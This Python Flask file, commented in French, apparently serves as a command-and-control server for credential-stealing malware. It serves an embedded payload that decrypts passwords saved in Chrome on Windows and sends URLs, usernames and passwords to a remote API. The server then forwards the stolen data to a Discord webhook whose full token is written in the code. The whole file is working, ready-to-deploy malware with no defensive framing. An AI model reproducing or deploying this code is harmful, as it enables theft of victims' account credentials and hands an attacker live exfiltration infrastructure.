from flask import Flask, request
import subprocess
import requests

app = Flask(__name__)

# URL Webhook Discord (Pour renvoyer les infos reçues)
WEBHOOK_URL = "https://discord.com/api/webhooks/1454123204246241431/FKBtOdjjS7WnmMIgRB4RMGEv1rZG51vm9ePVpZFf_u8YSo9vzkVUINpwnTCM8r3LLFmG"

# Le script payload (popup.py) que le Lua va télécharger
PAYLOAD_SCRIPT = r'''
import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import requests
import sys

# URL de l'API (ce serveur)
API_URL = "https://serveur-py.onrender.com/api/report" 

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        pass
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return ""

def get_passwords(key):
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(db_path): return "No DB"
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = []
    for row in cursor.fetchall():
        if row[1] and row[2]:
            dec = decrypt_password(row[2], key)
            if dec: data.append(f"URL: {row[0]}\nUser: {row[1]}\nPass: {dec}\n---")
    cursor.close()
    db.close()
    try: os.remove(filename)
    except: pass
    return "\n".join(data)

def send_to_api(message):
    try: requests.post(API_URL, json={"content": message})
    except: pass

if __name__ == "__main__":
    try:
        key = get_encryption_key()
        passwords = get_passwords(key)
        if passwords: send_to_api(f"**Passwords:**\n{passwords}")
        else: send_to_api("No passwords found.")
    except Exception as e:
        send_to_api(f"Error: {e}")
'''

@app.route('/', methods=['GET'])
def home():
    return "Server is running (C2 Ready)."

@app.route('/api/payload', methods=['GET'])
def get_payload():
    """Sert le script python au client Lua"""
    return PAYLOAD_SCRIPT

@app.route('/api/report', methods=['POST'])
def report():
    """Reçoit les données et les renvoie sur Discord"""
    data = request.json
    content = data.get('content', '')
    
    print(f"Reçu: {content[:50]}...") # Log console serveur
    
    # Renvoyer au Webhook Discord
    if content:
        # Découpage si trop long pour Discord
        chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
        for chunk in chunks:
            try:
                requests.post(WEBHOOK_URL, json={"content": f"```{chunk}```"})
            except:
                pass

    return {"status": "received"}

if __name__ == '__main__':
    # Sur Render, gunicorn utilisera 'server:app'
    app.run(host='0.0.0.0', port=5000)
